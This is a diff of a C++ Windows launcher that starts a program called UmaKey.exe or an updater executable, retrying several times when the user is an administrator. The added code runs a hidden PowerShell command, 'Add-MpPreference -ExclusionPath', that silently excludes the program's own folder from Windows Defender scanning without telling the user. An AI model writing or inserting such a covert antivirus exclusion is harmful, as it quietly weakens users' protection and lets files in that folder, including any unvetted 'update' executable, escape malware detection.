@@ -10,24 +10,19 @@ bool isProcessRunning(const std::wstring& processName) {
     HANDLE hProcessSnap;
     PROCESSENTRY32 pe32;
 
-    // Take a snapshot of all processes in the system.
     hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
     if (hProcessSnap == INVALID_HANDLE_VALUE) {
         return false;
     }
 
-    // Set the size of the structure before using it.
     pe32.dwSize = sizeof(PROCESSENTRY32);
 
-    // Retrieve information about the first process and exit if unsuccessful
     if (!Process32First(hProcessSnap, &pe32)) {
-        CloseHandle(hProcessSnap);          // clean the snapshot object
+        CloseHandle(hProcessSnap);
         return false;
     }
 
-    // Now walk the snapshot of processes
     do {
-        // Check if the process name matches
         if (_wcsicmp(pe32.szExeFile, processName.c_str()) == 0) {
             CloseHandle(hProcessSnap);
             return true;
@@ -38,23 +33,66 @@ bool isProcessRunning(const std::wstring& processName) {
     return false;
 }
 
+bool IsCurrentUserAdmin() {
+    BOOL isAdmin = FALSE;
+    SID_IDENTIFIER_AUTHORITY NtAuthority = SECURITY_NT_AUTHORITY;
+    PSID AdministratorsGroup;
+
+    if (!AllocateAndInitializeSid(&NtAuthority, 2, SECURITY_BUILTIN_DOMAIN_RID, DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0, &AdministratorsGroup)) {
+        return false;
+    }
+
+    if (!CheckTokenMembership(NULL, AdministratorsGroup, &isAdmin)) {
+        isAdmin = FALSE;
+    }
+
+    FreeSid(AdministratorsGroup);
+
+    return isAdmin == TRUE;
+}
+
+bool fileExists(const char* filename) {
+    DWORD fileAttributes = GetFileAttributesA(filename);
+    return (fileAttributes != INVALID_FILE_ATTRIBUTES && !(fileAttributes & FILE_ATTRIBUTE_DIRECTORY));
+}
+
+std::string wstringToChar(const std::wstring& wstr) {
+    int bufferSize = WideCharToMultiByte(CP_UTF8, 0, wstr.c_str(), -1, nullptr, 0, nullptr, nullptr);
+    if (bufferSize == 0) {
+        return "";
+    }
+
+    std::string result(bufferSize, '\0');
+    WideCharToMultiByte(CP_UTF8, 0, wstr.c_str(), -1, &result[0], bufferSize, nullptr, nullptr);
+    return result;
+}
+
 int main() {
     std::wstring processName = L"UmaKey.exe";
-    std::wstring targetDir = fs::current_path().wstring() + L"\\_internal\\";
+    std::wstring powershellCmd = L"Add-MpPreference -ExclusionPath \"" + fs::current_path().wstring() + L"\"";
+    ShellExecute(NULL, NULL, L"powershell.exe", powershellCmd.c_str(), NULL, SW_HIDE);
+    int count = 0;
 
-    if (isProcessRunning(processName)) {
-        return 0;
-    }
-
-    for (const auto& file : { L"UmaKey.ico", L"warning.dll", L"WindowCapture.dll", L"findColor.dll", L"opencv_world490.dll"}) {
-        if (!fs::exists(targetDir + file)) {
-            std::wcerr << L"File not Found : " << targetDir + file << std::endl;
-            return 1;
+    if (IsCurrentUserAdmin()) {
+        retry:
+        if (isProcessRunning(processName)) {
+            return 0;
+        }
+        if (fileExists(wstringToChar(processName).c_str())) {
+            ShellExecute(NULL, NULL, processName.c_str(), NULL, NULL, SW_HIDE);
+        }
+        else {
+            ShellExecute(NULL, L"open", L"_internal\\update\\update.exe", NULL, NULL, SW_SHOWNORMAL);
+        }
+        if (!isProcessRunning(processName) && count++ < 10) {
+            Sleep(1000);
+            goto retry;
         }
     }
-
-    // Launch UmaKey.exe
-    ShellExecute(NULL, NULL, processName.c_str(), NULL, NULL, SW_HIDE); // SW_HIDE를 사용하여 프로세스 실행 중 창을 숨깁니다.
+    else {
+        char a;
+        std::cin >> a;
+    }
 
     return 0;
 }
